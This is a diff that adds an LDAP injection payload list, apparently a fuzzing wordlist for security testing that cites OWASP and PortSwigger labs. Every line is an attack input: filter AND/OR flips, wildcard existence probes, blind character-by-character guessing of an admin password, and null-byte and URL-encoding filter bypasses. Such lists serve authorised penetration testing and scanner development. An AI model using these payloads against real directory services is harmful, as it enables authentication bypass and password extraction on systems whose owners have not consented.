@@ -1,0 +1,63 @@
+# category: ldap
+# description: LDAP injection — AND/OR flips, wildcard existence, blind char-by-char, bind-bypass.
+# references: OWASP LDAP Injection, PortSwigger LDAP labs.
+
+*
+*)
+*)(uid=*
+*)(|(uid=*
+*)(cn=*
+*))(|(cn=*
+*))(|(cn=*))
+*))%00
+*)%00
+*)(mail=*
+*)(objectClass=*
+*)(objectClass=*))
+(|(uid=*))
+(|(cn=*)
+(&(uid=*)(userPassword=*))
+(&(uid=*)(userPassword=*
+admin*
+admin*)((uid=*
+admin)(&))
+admin))(|(cn=*
+admin))(|(password=*))
+admin)(|(objectClass=*))
+admin)(!(&(1=0)
+admin)(cn=*))
+admin\00
+admin\
+admin*)(|(password=*))
+admin))%00
+*)(uid=*))(|(uid=*
+*)(|(objectclass=*)(objectclass=*))
+*)(|(mail=*@*)
+*))(&(|(cn=*)
+*;x
+
+# ── Blind char-by-char ───────────────────────────────────────────────────
+admin*)(&(password=a*)
+admin*)(&(password=b*)
+admin*)(&(password=A*)
+admin*)(&(userPassword=*))
+admin*)(&(cn=*))
+*)(|(cn=a*)
+*)(|(cn=b*)
+*)(|(cn=admin)
+*)(|(cn=root)
+*)(|(mail=a*)
+
+# ── Bypass filters ──────────────────────────────────────────────────────
+admin\28
+admin\29
+admin\2a
+admin\5c
+admin*%00
+admin*%0a
+admin*\n
+admin*)%00
+admin%2a
+admin%28cn=*%29
+*%0a
+*(|%28cn=*%29
